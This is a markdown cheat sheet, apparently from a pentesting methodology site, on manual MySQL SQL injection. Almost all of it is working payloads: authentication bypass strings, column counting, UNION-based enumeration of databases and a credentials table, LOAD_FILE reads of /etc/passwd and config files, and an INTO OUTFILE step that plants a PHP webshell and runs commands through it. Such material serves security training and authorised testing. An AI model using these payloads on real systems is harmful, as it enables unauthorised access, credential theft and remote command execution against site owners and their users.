---
title: "SQL Injection Fundamentals"
description: "UNION, error-based, blind, and manual SQLi techniques."
sidebar:
  order: 3
  label: "SQL Injection Fundamentals"
---
> Manual SQLi in MySQL: auth bypass with OR/comments, UNION-based enumeration, file read/write, and webshell.

---


## SQLi Detection

```sql
-- Detection payloads (test in GET/POST/Headers parameters)
'
"
#
;
)
' OR '1'='1
' AND '1'='1
' AND '1'='2

-- URL encoded
%27  -> '
%22  -> "
%23  -> #
```

### Vulnerability Signs

```
- SQL error in the response -> direct injection
- Change in the result (more/less data) -> boolean-based
- Different behavior -> blind
- Delay -> time-based (SLEEP)
```

---

## Auth Bypass

```sql
-- OR injection in username (when username exists)
admin' or '1'='1
-- -> SELECT * FROM logins WHERE username='admin' or '1'='1' AND password='something'

-- OR in both fields (without knowing the username)
' or '1'='1
-- password field: something' or '1'='1

-- Bypass with comment (known admin user)
admin'-- -
-- -> SELECT * FROM logins WHERE username='admin'-- ' AND password='...'

-- If there are parentheses
admin')-- -
-- -> SELECT * FROM logins WHERE (username='admin')
```

> **Tip:** `-- -` (with a trailing space) or `-- ` are equivalent. `#` also works in MySQL. In URLs: `--+` or `%23`.

---

## Determining the Number of Columns

### ORDER BY Method (increment until error)

```sql
' order by 1-- -    -> OK
' order by 2-- -    -> OK
' order by 3-- -    -> OK
' order by 4-- -    -> ERROR  -> table has 3 columns
```

### UNION Method (add columns until no error)

```sql
' UNION select 1,2,3-- -    -> ERROR: different number of columns
' UNION select 1,2,3,4-- -  -> OK   -> 4 columns
```

---

## Identifying Visible Columns

```sql
-- Use numbers to know which ones are rendered on the page
' UNION select 1,2,3,4-- -
-- See which numbers appear in the response -> those are the visible ones

-- Confirm with real data in visible column (e.g. column 2)
' UNION select 1,@@version,3,4-- -
```

---

## MySQL Fingerprinting

```sql
' UNION select 1,@@version,3,4-- -          -- DB version
' UNION select 1,database(),3,4-- -         -- current database
' UNION select 1,user(),3,4-- -             -- current DBMS user
' UNION select 1,@@datadir,3,4-- -          -- data directory
' UNION select 1,SLEEP(5),3,4-- -           -- time-based blind (5s delay)
' UNION select 1,POW(1,1),3,4-- -           -- if only numerical output
```

---

## Enumeration — INFORMATION_SCHEMA

### Listing Databases

```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

-- Ignore: information_schema, mysql, performance_schema, sys (system DBs)
```

### Listing Tables of a DB

```sql
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES 
  where table_schema='dev'-- -
```

### Listing Columns of a Table

```sql
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA 
  from INFORMATION_SCHEMA.COLUMNS 
  where table_name='credentials'-- -
```

### Extracting Data

```sql
-- Syntax: db.table (if current DB is different from the target)
' UNION select 1,username,password,4 from dev.credentials-- -

-- Concatenate two columns in one (if only one column is visible)
' UNION select 1,concat(username,':',password),3,4 from dev.credentials-- -
```

---

## SQL Cheatsheet — Useful Queries

```sql
-- Local MySQL connection
mysql -u root -p
mysql -u root -p<password>
mysql -u root -h 10.10.10.1 -P 3306 -p

-- View databases / tables
SHOW DATABASES;
USE database_name;
SHOW TABLES;
DESCRIBE table;

-- Basic CRUD
SELECT * FROM table;
SELECT col1, col2 FROM table WHERE condition;
SELECT * FROM table ORDER BY col1 DESC LIMIT 10;
SELECT * FROM table WHERE username LIKE 'admin%';   -- % = wildcard
SELECT * FROM table WHERE username LIKE '___';      -- _ = exactly 1 char
INSERT INTO table(col1,col2) VALUES ('val1','val2');
UPDATE table SET col1='new' WHERE id=1;
DELETE FROM table WHERE id=1;
```

---

## SQL Comments in Injection

```sql
-- MySQL comment types
-- -           -> line comment (needs space at the end)
#             -> line comment (URL: %23 in browser)
/**/          -> inline comment (to bypass space filters)

-- Examples
admin'-- -      -> comments out the rest of the query
' UNION select 1,2-- -
' OR 1=1#
```

---

## Reading Files (requires FILE privilege)

```sql
-- Verify current user
' UNION SELECT 1,user(),3,4-- -
' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user="root"-- -

-- Verify FILE privileges
' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges 
  WHERE grantee="'root'@'localhost'"-- -

-- Read file
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3,4-- -

-- Verify secure_file_priv (empty = we can read/write everything)
' UNION SELECT 1,variable_name,variable_value,4 
  FROM information_schema.global_variables 
  WHERE variable_name="secure_file_priv"-- -
```

---

## Writing Files and Webshell

```sql
-- Verify if we can write (secure_file_priv must be empty)
-- Step 1: verify FILE privilege and secure_file_priv (see previous section)

-- Step 2: test writing in webroot
' UNION select 1,'test_write',3,4 INTO OUTFILE '/var/www/html/test.txt'-- -
-- Verify: http://target/test.txt

-- Step 3: write PHP webshell
' UNION select "","<?php system($_REQUEST[0]); ?>","","" 
  INTO OUTFILE '/var/www/html/shell.php'-- -

-- Step 4: execute commands
# http://target/shell.php?0=id
# http://target/shell.php?0=whoami
# http://target/shell.php?0=cat+/etc/passwd
```

### Default Webroot Paths

```
Linux  (Apache): /var/www/html/
Linux  (Nginx):  /usr/share/nginx/html/
Windows (Apache): C:/xampp/htdocs/
Windows (IIS):   C:/inetpub/wwwroot/

-- Read server config to find webroot
' UNION SELECT 1,LOAD_FILE('/etc/apache2/apache2.conf'),3,4-- -
' UNION SELECT 1,LOAD_FILE('/etc/nginx/nginx.conf'),3,4-- -
```

---

## SQL Operators — Reference

| Operator | Description | Equivalent Symbol |
|----------|-------------|---------------------|
| `AND` | Both conditions true | `&&` |
| `OR` | At least one true | `\|\|` |
| `NOT` | Negates the condition | `!` |
| `=` `!=` `>` `<` | Comparison | — |
| `LIKE 'val%'` | Wildcard (`%`=0+chars, `_`=1 char) | — |

---

## Pitfalls / Gotchas

- **ORDER BY number > columns:** an error that reveals we exceeded the limit (useful for counting).
- **UNION different columns:** the number of columns in SELECT must be equal. Fill with numbers or NULL.
- **Invisible column:** if column 1 is not rendered on the page, place the payload in column 2 or 3.
- **Quotes in comments:** `-- -` requires a space. In URLs use `--+` or `%20`.
- **`#` in browser:** the browser interprets it as a fragment. Use `%23` in the URL.
- **Non-empty secure_file_priv:** LOAD_FILE() and INTO OUTFILE will not work. Modern MySQL blocks this by default.
- **OS write privileges:** even if MySQL has FILE privilege, the `mysql` user needs write permissions in the target directory.
- **Error not shown:** if the app does not display SQL errors, you will need blind SQLi or use sqlmap with `--technique=B`.
- **Concatenating columns:** if there is only 1 visible column, use `concat(col1,':',col2)` or `group_concat(col1)`.
- **NULL vs numbers:** use NULL to fill columns in UNION when there is data type incompatibility.

---

## Related Cheatsheets

- [SQLMap Essentials](/en/metodologias/web/sqlmap-essentials/) — SQLi automation: detection, dump, OS shell
- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercepting and manipulating SQL requests in Burp/ZAP
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — PHP webshell post-exploitation of SQLi
- [File Transfers](/en/metodologias/privesc/file-transfers/) — exfiltrating data from the server after compromising via SQLi
